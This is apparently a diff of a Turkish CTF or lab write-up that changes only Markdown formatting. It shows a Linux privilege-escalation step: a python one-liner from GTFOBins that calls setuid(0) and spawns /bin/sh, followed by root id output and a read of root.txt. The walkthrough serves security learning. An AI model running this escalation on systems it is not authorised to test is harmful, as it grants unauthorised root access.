@@ -104,7 +104,7 @@ komutu ile root olarak kullanbileceğimiz progrmaları listeliyoruz.
 /usr/bin/python ı görüyoruz ve bunla yetki yükseltmeye çalışıyoruz.
 ```
 [GTFOBins](https://gtfobins.github.io/) adresinde pythonu aratıyor ve python yetki yükseltme komutunu buluyoruz:
-```
+
 >-c 'import os; os.setuid(0); os.system("/bin/sh")'
 
 `pythonun bulunduğu dizini belirterek (/usr/bin/python) pythonu çalıştırıyor ve yetki yükseltme komutumuzu yazıyoruz.`
@@ -112,9 +112,9 @@ komutu ile root olarak kullanbileceğimiz progrmaları listeliyoruz.
 >/usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
 
 
-id yazarak root olduğumuzu görüyoruz:
+>id yazarak root olduğumuzu görüyoruz:
 
->uid=0(root) gid=33(www-data) groups=33(www-data)
+`uid=0(root) gid=33(www-data) groups=33(www-data)`
 
 
 `/root dizini altında bulunan root.txt dosyasını okuyoruz`
